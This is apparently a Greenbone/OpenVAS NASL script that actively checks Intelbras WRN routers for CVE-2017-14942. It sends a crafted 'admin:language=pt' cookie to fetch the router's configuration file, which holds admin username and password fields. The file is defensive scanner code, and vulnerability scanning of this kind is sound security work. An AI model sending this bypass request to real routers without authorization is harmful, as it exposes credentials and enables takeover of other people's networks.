# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:intelbras_roteador:wireless-n_wrn";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.812015");
  script_version("2025-03-26T05:38:58+0000");
  script_cve_id("CVE-2017-14942");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-03-26 05:38:58 +0000 (Wed, 26 Mar 2025)");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-10-03 00:03:00 +0000 (Thu, 03 Oct 2019)");
  script_tag(name:"creation_date", value:"2017-10-06 20:36:50 +0530 (Fri, 06 Oct 2017)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("Intelbras Roteador Wireless N WRN Device Authentication Bypass Vulnerability - Active Check");

  script_tag(name:"summary", value:"Intelbras Roteador Wireless N WRN devices are prone to an
  authentication bypass vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to get specific information or not.");

  script_tag(name:"insight", value:"The flaw exists due to an insufficient
  access control and any attacker could bypass the admin authentication just
  by tweaking the cookie.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to bypass authentication mechanism and gain access to sensitive data.");

  script_tag(name:"affected", value:"Intelbras Roteador Wireless WRN150 devices with firmware
  version 1.0.1 are known to be affected. Other models and other firmware versions may also be
  affected.");

  script_tag(name:"solution", value:"Update to the latest firmware available
  from the vendor.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/42916");
  script_xref(name:"URL", value:"http://whiteboyz.xyz/authentication-bypass-intelbras-wrn-150.html");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_intelbras_roteador_wireless_n_wrn_devices_detect.nasl");
  script_mandatory_keys("intelbras/roteador/N-WRN/detected");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(port:port, cpe:CPE, nofork:TRUE))
  exit(0);

# nb: Thiw was tested on a live N-WRN 300 which is also vulnerable so no checking for model
# here
url = "/cgi-bin/DownloadCfg/RouterCfm.cfg";

req = http_get_req(port:port, url:url, add_headers:make_array("Cookie", "admin:language=pt"));
res = http_keepalive_send_recv(port:port, data:req);

if(res =~ "^HTTP/1\.[01] 200" && "wps_device_name=INTELBRAS Wireless" >< res &&
   "lan_gateway=" >< res && "http_username=" >< res && "http_passwd=" >< res &&
   "wps_device_pin=" >< res && "wl_version=" >< res) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
